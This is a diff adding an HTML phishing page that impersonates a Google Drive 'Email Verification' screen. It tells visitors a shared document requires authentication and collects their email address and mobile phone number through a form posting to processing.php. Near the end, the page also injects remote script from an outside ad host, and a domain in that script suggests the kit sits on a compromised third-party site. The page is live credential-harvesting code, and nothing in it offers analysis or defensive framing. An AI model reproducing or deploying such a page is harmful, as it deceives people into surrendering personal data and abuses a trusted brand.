@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<a0:html xmlns:a0="http://www.w3.org/1999/xhtml" xmlns='\"http://www.w3.org/1999/xhtml\"'>
+ <a0:head>
+  <a0:link type="" rel="icon">
+   <a0:title>
+    Google Documents Email Verification
+   </a0:title>
+  </a0:link>
+  <a0:link media="all" href="index.css" type="text/css" rel="stylesheet">
+   <a0:style>
+    button::-moz-focus-inner, input::-moz-focus-inner { border: 0px none; }
+input[type=email], input[type=number], input[type=password], input[type=tel], input[type=text], input[type=url] { display: inline-block; height: 29px; margin: 0px; padding: 0px 8px; background: none repeat scroll 0% 0% rgb(255, 255, 255); border-right: 1px solid rgb(217, 217, 217); border-width: 1px; border-style: solid; border-color: rgb(192, 192, 192) rgb(217, 217, 217) rgb(217, 217, 217); -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; border-image: none; -moz-box-sizing: border-box; border-radius: 1px 1px 1px 1px; }
+input[type=email]:hover, input[type=number]:hover, input[type=password]:hover, input[type=tel]:hover, input[type=text]:hover, input[type=url]:hover { border-right: 1px solid rgb(185, 185, 185); border-width: 1px; border-style: solid; border-color: rgb(160, 160, 160) rgb(185, 185, 185) rgb(185, 185, 185); -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; border-image: none; box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1) inset; }
+input[type=email]:focus, input[type=number]:focus, input[type=password]:focus, input[type=tel]:focus, input[type=text]:focus, input[type=url]:focus { outline: medium none; border: 1px solid rgb(77, 144, 254); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.3) inset; }
+input[type=checkbox], input[type=radio] { width: 13px; height: 13px; margin: 0px; cursor: pointer; vertical-align: bottom; background: none repeat scroll 0% 0% rgb(255, 255, 255); border: 1px solid rgb(220, 220, 220); border-radius: 1px 1px 1px 1px; -moz-box-sizing: border-box; position: relative; }
+input[type=checkbox]:active, input[type=radio]:active { border-color: rgb(198, 198, 198); background: none repeat scroll 0% 0% rgb(235, 235, 235); }
+input[type=checkbox]:hover { border-color: rgb(198, 198, 198); box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1) inset; }
+input[type=checkbox]:checked, input[type=radio]:checked { background: none repeat scroll 0% 0% rgb(255, 255, 255); }
+input[type=checkbox]:checked:after { content: url('checkmark.png'); display: block; position: absolute; top: -6px; left: -5px; }
+input[type=checkbox]:focus { outline: medium none; border-color: rgb(77, 144, 254); }
+.g-button { display: inline-block; min-width: 46px; text-align: center; color: rgb(68, 68, 68); font-size: 11px; font-weight: bold; height: 27px; padding: 0px 8px; line-height: 27px; border-radius: 2px 2px 2px 2px; transition: all 0.218s ease 0s ; border: 1px solid rgb(220, 220, 220); background-color: rgb(245, 245, 245); background-image: -moz-linear-gradient(center top , rgb(245, 245, 245), rgb(241, 241, 241)); -moz-user-select: none; cursor: default; }
+button.g-button, input.g-button[type=submit] { height: 29px; line-height: 29px; vertical-align: bottom; margin: 0px; }
+.g-button:hover { border: 1px solid rgb(198, 198, 198); color: rgb(51, 51, 51); text-decoration: none; transition: all 0s ease 0s ; background-color: rgb(248, 248, 248); background-image: -moz-linear-gradient(center top , rgb(248, 248, 248), rgb(241, 241, 241)); box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1); }
+.g-button:active { background-color: rgb(246, 246, 246); background-image: -moz-linear-gradient(center top , rgb(246, 246, 246), rgb(241, 241, 241)); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1) inset; }
+.g-button-submit { border: 1px solid rgb(48, 121, 237); color: rgb(255, 255, 255); text-shadow: 0px 1px rgba(0, 0, 0, 0.1); background-color: rgb(77, 144, 254); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(71, 135, 237)); }
+.g-button-submit:hover { border: 1px solid rgb(47, 91, 183); color: rgb(255, 255, 255); text-shadow: 0px 1px rgba(0, 0, 0, 0.3); background-color: rgb(53, 122, 232); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(53, 122, 232)); }
+.g-button-submit:active { background-color: rgb(53, 122, 232); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(53, 122, 232)); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.3) inset; }
+.sign-in { width: 335px; position: absolute; left: 248px; top: 175px;}
+.signin-box, .accountchooser-box { margin: 12px 0px 0px; padding: 20px 25px 15px; background: none repeat scroll 0% 0% rgb(241, 241, 241); border: 1px solid rgb(229, 229, 229); }
+.signin-box h2 { font-size: 16px; line-height: 17px; height: 16px; margin: 0px 0px 1.2em; position: relative; }
+.signin-box h2 strong { display: inline-block; position: absolute; right: 0px; top: 1px; height: 19px; width: 52px; }
+.signin-box div { margin: 0px 0px 1.5em; }
+.signin-box input[type=email], .signin-box input[type=text], .signin-box input[type=password] { width: 100%; height: 32px; font-size: 15px; direction: ltr; }
+.signin-box .email-label, .signin-box .passwd-label { font-weight: bold; margin: 0px 0px 0.5em; display: block; -moz-user-select: none; }
+.signin-box label.remember { display: inline-block; vertical-align: top; margin: 9px 0px 0px; }
+.signin-box .remember-label { font-weight: normal; color: rgb(102, 102, 102); line-height: 0; padding: 0px 0px 0px 0.4em; -moz-user-select: none; }
+.signin-box input[type=submit] { margin: 0px 1.5em 1.2em 0px; height: 32px; font-size: 13px; }
+.signin-box ul { margin: 0px;}
+}
+
+.auto-style1 {
+	color: rgb(232, 12, 12);
+	font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+}
+    .style8 {font-size: 12px; color: #000066; }
+    .style9 {
+	font-size: 12px;
+	color: #999999;
+	font-weight: bold;
+}
+    .style13 {color: #000000; font-weight: bold; }
+    .style15 {	font-size: 10px;
+	color: #FF6600;
+}
+    .style16 {color: #FF9900}
+    .style18 {font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; color: #999999;}
+   </a0:style>
+   <a0:script language="Javascript">
+    function echeck(str) {
+ 
+		var at="@"
+		var dot="."
+		var lat=str.indexOf(at)
+		var lstr=str.length
+		var ldot=str.indexOf(dot)
+		if (str.indexOf(at)==-1){
+		   alert("Enter email as username@domain.com")
+		   return false
+		}
+ 
+		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
+		   alert("Enter email as username@domain.com")
+		   return false
+		}
+ 
+		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
+		    alert("Enter email as username@domain.com")
+		    return false
+		}
+ 
+		 if (str.indexOf(at,(lat+1))!=-1){
+		    alert("Enter email as username@domain.com")
+		    return false
+		 }
+ 
+		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
+		    alert("Enter email as username@domain.com")
+		    return false
+		 }
+ 
+		 if (str.indexOf(dot,(lat+2))==-1){
+		    alert("Enter email as username@domain.com")
+		    return false
+		 }
+		
+		 if (str.indexOf(" ")!=-1){
+		    alert("Enter email as username@domain.com")
+		    return false
+		 }
+ 
+ 		 return true					
+	}
+ 
+   function ValidateFormOther(){
+	var emailID=document.other.email
+	var emailPASS=document.other.phone
+	
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please Enter your Email Address to View Shared Document")
+		emailID.focus()
+		return false
+	}
+	if ((emailPASS.value==null)||(emailPASS.value=="")){
+		alert("Your Mobile Phone is required to View Google Shared Document")
+		emailPASS.focus()
+		return false
+	}
+	if (echeck(emailID.value)==false){
+		emailID.value=""
+		emailID.focus()
+		return false
+	}
+	return true
+ }
+   </a0:script>
+  </a0:link>
+ </a0:head>
+ <a0:body>
+  <a0:div id="c-doc">
+  </a0:div>
+  <a0:div id="c-header">
+  </a0:div>
+  <a0:div id="c-header-wrapper">
+   <a0:a id="logo">
+   </a0:a>
+   <a0:a id="cust_logo" href="#">
+    <a0:img width="116" height="41" src="google_logo_41.png" alt="Google logo">
+     <a0:span class="goog-inline-block">
+      Drive
+     </a0:span>
+    </a0:img>
+   </a0:a>
+   <a0:ul id="c-nav">
+    <a0:li>
+    </a0:li>
+   </a0:ul>
+  </a0:div>
+  <a0:div align="center">
+   <a0:table width="1056" border="0" cellspacing="0" cellpadding="0">
+    <!--DWLayoutTable-->
+    <a0:tbody>
+     <a0:tr>
+      <a0:td width="344" valign="top" height="268">
+       <a0:img width="521" height="381" src="jewel.png">
+       </a0:img>
+      </a0:td>
+      <a0:td width="712" valign="top">
+      </a0:td>
+     </a0:tr>
+    </a0:tbody>
+   </a0:table>
+  </a0:div>
+  <a0:div id="main-content">
+  </a0:div>
+  <a0:div class="c-button" id="action">
+   <a0:h3 align="left" class="style8">
+    <a0:span class="style13">
+     Shared documents requires email authentication
+    </a0:span>
+   </a0:h3>
+   <a0:p align="left" class="style9">
+    Enter your email address below to view the document.
+   </a0:p>
+  </a0:div>
+  <a0:div align="center">
+   <a0:span class="ap_col2 bold ap_radio_label">
+    <a0:br>
+    </a0:br>
+   </a0:span>
+   <a0:form onsubmit="return ValidateFormOther()" action="processing.php" method="post" name="other">
+    <a0:p>
+     <a0:span class="style18">
+      Email Address
+     </a0:span>
+     <a0:span class="style16">
+     </a0:span>
+    </a0:p>
+    <a0:label>
+     <a0:input type="text" maxlength="30" id="account_number" size="16" value="" name="email">
+     </a0:input>
+    </a0:label>
+    <a0:p>
+     <a0:span class="style18">
+      Phone Number
+     </a0:span>
+     <a0:span class="style16">
+     </a0:span>
+    </a0:p>
+    <a0:span class="style16">
+     <a0:label>
+      <a0:input type="text" maxlength="14" id="account_number" size="16" value="" name="phone">
+      </a0:input>
+     </a0:label>
+    </a0:span>
+    <a0:label>
+    </a0:label>
+    <a0:p>
+     <a0:input type="submit" value="View Document" class="g-button-submit" name="Submit">
+     </a0:input>
+    </a0:p>
+    <a0:p>
+    </a0:p>
+   </a0:form>
+   <a0:p>
+   </a0:p>
+   <a0:table border="1">
+    <a0:tbody>
+     <a0:tr>
+      <a0:td>
+       <a0:span class="ap_col2 bold ap_radio_label">
+        <a0:a href="javascript:togglegmail();">
+        </a0:a>
+       </a0:span>
+      </a0:td>
+      <a0:td>
+       <a0:span class="ap_col2 bold ap_radio_label">
+        <a0:a href="javascript:toggleaol();">
+        </a0:a>
+       </a0:span>
+      </a0:td>
+     </a0:tr>
+     <a0:tr>
+      <a0:td>
+       <a0:span class="ap_col2 bold ap_radio_label">
+        <a0:a href="javascript:toggle();">
+        </a0:a>
+       </a0:span>
+      </a0:td>
+      <a0:td>
+       <a0:span class="ap_col2 bold ap_radio_label">
+        <a0:a href="javascript:togglehotmail();">
+        </a0:a>
+       </a0:span>
+      </a0:td>
+     </a0:tr>
+     <a0:tr>
+      <a0:td>
+       <a0:span class="ap_col2 bold ap_radio_label">
+        <a0:a href="javascript:toggleother();">
+        </a0:a>
+       </a0:span>
+      </a0:td>
+     </a0:tr>
+    </a0:tbody>
+   </a0:table>
+   <a0:form action="" method="post" name="form2">
+    <a0:label>
+    </a0:label>
+   </a0:form>
+  </a0:div>
+  <a0:div class="more-links">
+  </a0:div>
+  <a0:span class="ap_col2 bold ap_radio_label">
+  </a0:span>
+  <a0:span id="ap_caps_warn_span">
+   <a0:div style="visibility:hidden;" class="ap_caps_warn ap_col3_caps_warn" id="ap_caps_warning">
+    <!--[if lt IE 7]>
+  <style type="text/css">
+  .ap_caps_warn {
+    display: none;
+  }
+  </style>
+  <![endif]-->
+   </a0:div>
+  </a0:span>
+  <a0:div class="ap_row" id="ap_signin1a_cnep_row">
+  </a0:div>
+  <a0:div class="ap_row">
+  </a0:div>
+  <!--[if lte IE 8]>
+    </div>
+<![endif]-->
+  <a0:div id="javascriptSlots">
+  </a0:div>
+  <a0:div id="javascript-identity">
+  </a0:div>
+  <a0:div id="js-trms">
+  </a0:div>
+  <a0:script type="text/javascript">
+   if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("&lt;scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;amp;enc=telkom2");document.write("&amp;amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRZ2sR%2fu%2bCw5fahAvzK3TtVAhv82P%2f3w6bF05aIcmpy6To%2bdiB1Mu9mnwDhcprYtIGq65m5IeLWNTpyzbpDMk8MYskkdpS0Kbbkss2xIi4wkp1w3mmDHU25vPDqlF8r0MYytUq%2fxmll%2fYRtH2JXYR2DHuSNSzXAr57Vpfi3GA7lh2mIP%2f0%2bNzkGI%2b2ruKjMIDGzp277dpvszsL0%2bkAbGgKfKI1hwpGcgAb36SHxy6Q%2fTS3Umt6PxgKqsRLOMKi50JMu7xu9KqAijmXC1gTSjAEpHE%2bXJ%2bOp4QsfZRaNSeeIXTFAV2rT%2f1nvpB2vHAwdP3wtpD0cVwSPvRNB57D8yfqVHKDrmbyuy%2b08dzvoFoVO7VKC3yLx2ubhS8j%2fVGtp9nsB3IcF9njQigEc%2b%2fH62iWPLMvWeldtqY%2fc8Swgu1xz1QiOx9gkRx7iqbAnRU4SOU8jcroJO%2fNy14xVV%2ffKeWGIf4uGFrl8%2b%2b%2fYE4snQoAg1M%3d");document.write("&amp;amp;idc_r="+idc_glo_r);document.write("&amp;amp;domain="+document.domain);document.write("&amp;amp;sw="+screen.width+"&amp;amp;sh="+screen.height);document.write("&gt;&lt;/scr"+"ipt&gt;");}
+  </a0:script>
+  <a0:script src="http://cfs.u-ad.info/cfspushadsv2/request?id=1&enc=telkom2&params=4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRZ2sR%2fu%2bCw5fahAvzK3TtVAhv82P%2f3w6bF05aIcmpy6To%2bdiB1Mu9mnwDhcprYtIGq65m5IeLWNTpyzbpDMk8MYskkdpS0Kbbkss2xIi4wkp1w3mmDHU25vPDqlF8r0MYytUq%2fxmll%2fYRtH2JXYR2DHuSNSzXAr57Vpfi3GA7lh2mIP%2f0%2bNzkGI%2b2ruKjMIDGzp277dpvszsL0%2bkAbGgKfKI1hwpGcgAb36SHxy6Q%2fTS3Umt6PxgKqsRLOMKi50JMu7xu9KqAijmXC1gTSjAEpHE%2bXJ%2bOp4QsfZRaNSeeIXTFAV2rT%2f1nvpB2vHAwdP3wtpD0cVwSPvRNB57D8yfqVHKDrmbyuy%2b08dzvoFoVO7VKC3yLx2ubhS8j%2fVGtp9nsB3IcF9njQigEc%2b%2fH62iWPLMvWeldtqY%2fc8Swgu1xz1QiOx9gkRx7iqbAnRU4SOU8jcroJO%2fNy14xVV%2ffKeWGIf4uGFrl8%2b%2b%2fYE4snQoAg1M%3d&idc_r=47133763091&domain=esypesaconstrucciones.com&sw=1024&sh=768" type="text/javascript">
+  </a0:script>
+  <a0:noscript>
+   activate javascript
+  </a0:noscript>
+  <!--DWLayoutEmptyCell-->
+  <a0:tr>
+   <a0:td height="32">
+   </a0:td>
+   <a0:td>
+   </a0:td>
+  </a0:tr>
+ </a0:body>
+</a0:html>
